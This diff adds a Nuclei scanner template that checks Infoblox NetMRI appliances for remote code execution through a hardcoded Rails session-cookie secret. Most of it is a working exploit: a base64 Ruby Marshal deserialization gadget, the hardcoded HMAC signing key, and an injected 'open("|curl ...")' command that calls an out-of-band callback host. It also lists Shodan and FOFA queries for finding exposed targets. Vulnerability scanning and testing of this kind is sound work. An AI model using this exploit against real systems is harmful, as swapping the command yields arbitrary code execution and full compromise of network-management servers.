@@ -1,0 +1,52 @@
+id: infoblox-netmri-rails-cookie-rce
+
+info:
+  name: Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key
+  author: iamnoooob,pdresearch
+  severity: critical
+  description: |
+    Infoblox NetMRI virtual appliances before version 7.6.1 are vulnerable to remote code execution (RCE) due to the use of a hardcoded Ruby on Rails session cookie secret key. The Rails web component deserializes session cookies if the signing key is valid. Attackers with knowledge of this key can craft malicious session cookies that are deserialized by the application, leading to arbitrary code execution. This vulnerability is related to the known Ruby on Rails deserialization flaw (CVE-2013-0156). Infoblox did not assign a new CVE for this issue, as it is a result of the underlying Rails vulnerability.
+  impact: |
+    An attacker can exploit this vulnerability to execute arbitrary commands on the NetMRI server, potentially leading to complete system compromise.
+  remediation: |
+    Upgrade Infoblox NetMRI to version 7.6.1 or later to mitigate this vulnerability.
+  reference:
+    - https://rhinosecuritylabs.com/research/infoblox-multiple-cves/
+    - https://nvd.nist.gov/vuln/detail/CVE-2013-0156
+  classification:
+    cwe-id: CWE-502
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: infoblox
+    product: netmri
+    shodan-query:
+      - http.title:"netmri"
+      - http.favicon.hash:"-319724102"
+    fofa-query:
+      - icon_hash="-319724102"
+      - infoblox netmri
+  tags: infoblox,netmri,rails,rce,deserialization,oast
+
+variables:
+  oast: ".{{interactsh-url}}"
+  padded_oast: "{{padding(oast,'a',50,'prefix')}}"
+  old_code: "b3BlbigifGN1cmwgeHh4eC4yYmVyNzQyYXVyZ3BrN2Jpc3cxY3BodWg5OGZ6M3J5Zm4ub2FzdGlmeS5jb20iKQ=="
+  code1: 'open("|curl {{padded_oast}}")'
+  marshal_data: '{{base64(replace(base64_decode("BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQc6DkBpbnN0YW5jZW86CEVSQgc6CUBzcmNJInhldmFsKCdiM0JsYmlnaWZHTjFjbXdnZUhoNGVDNHlZbVZ5TnpReVlYVnlaM0JyTjJKcGMzY3hZM0JvZFdnNU9HWjZNM0o1Wm00dWIyRnpkR2xtZVM1amIyMGlLUT09Jy51bnBhY2soJ20wJykuZmlyc3QpBjoGRVQ6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0"),old_code,base64(code1)))}}'
+  signature: "{{hmac('sha1', marshal_data, 'b525fc341ce5f4d76505e7664863750f865823ba866c536e0246c195cd6cf19cc63771d6becd71c99f5beef080ac27bc3b4f72430840d83cb4efd62acb7c6dcf')}}"
+
+http:
+  - raw:
+      - |
+        GET /webui/gui_states/index.json HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: _netmri={{urlencode(marshal_data)}}--{{signature}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'dns')"
+          - "status_code == 500"
+        condition: and
+# digest: 4a0a004730450220464623caf448d7857f1a5126f58e7c6eddf72e92f705155d923b79df6dc2d08102210097be9183426bc56f5d01b3b62149d152d6797cc7de5c5c53b15068edf04643a4:922c64590222798bb761d5b6d8e72950
